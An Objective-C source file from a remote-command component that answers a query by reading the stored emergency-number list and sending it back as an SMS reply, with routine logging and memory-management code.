/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryEmergencyNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryEmergencyNumberProcessor.h"
#import "PrefEmergencyNumber.h"
#import "Preference.h"

@interface QueryEmergencyNumberProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryEmergencyNumber;
@end

@implementation QueryEmergencyNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryEmergencyNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (QueryEmergencyNumberProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryEmergencyNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryEmergencyNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"QueryEmergencyNumberProcessor--->doProcessingCommand")
    [self processQueryEmergencyNumber];
}


#pragma mark QueryEmergencyNumberProcessor  PrivateAPI

/**
 - Method name: processQueryEmergencyNumber
 - Purpose:This method is used to process query emergency number
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processQueryEmergencyNumber {
	DLog (@"QueryEmergencyNumberProcessor--->processQueryEmergencyNumber")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEmergencyNumber *prefEmergencyNumberList = (PrefEmergencyNumber *) [prefManager preference:kEmergency_Number];
	
	NSArray *emergencyNumberList=[prefEmergencyNumberList mEmergencyNumbers];
	
	NSString *result=NSLocalizedString(@"kQueryEmergencyNumber", @"");
	for (NSString *emergencyNumber in emergencyNumberList) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:emergencyNumber];
	}
	
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
 */

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryEmergencyNumberProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryEmergencyNumberMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryEmergencyNumberMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryEmergencyNumberMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end